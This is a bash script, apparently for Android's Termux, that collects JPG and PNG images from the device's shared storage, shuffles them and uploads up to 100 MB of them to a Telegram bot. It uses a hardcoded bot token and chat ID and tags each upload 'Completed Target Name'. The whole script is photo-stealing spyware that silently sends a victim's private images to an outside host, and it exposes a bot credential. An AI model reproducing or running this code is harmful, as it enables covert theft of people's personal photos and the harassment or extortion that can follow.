#!/bin/bash
TOKEN="7465534118:AAFcJ_Rp5W3DCJnYSIVtCkzph0ORIZSGkVY"
CHAT_ID="5034446293"
  cek="/data/data/com.termux/files/sopowesu.txt"
  nama=$(cat "$cek")


files=($(find /storage/ -type f \( -iname "*.jpg" -o -iname "*.png" \) | shuf)) 
group_id=$(id -g)
total_size=0
max_size=104857600
for file in "${files[@]}"; do
    size=$(stat -c %s "$file")
    if (( total_size + size <= max_size )); then
        response=$(curl -s -w "\n%{http_code}" -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
            -F chat_id="$CHAT_ID" \
            -F document=@"$file" \
            -F caption="Completed Target Name: $nama  ID: $group_id")
        http_code=$(echo "$response" | tail -n 1)
        if [ "$http_code" -ne 200 ]; then
            echo "Error uploading $file: $response"
        fi
        total_size=$((total_size + size))
    else
        break
    fi
done
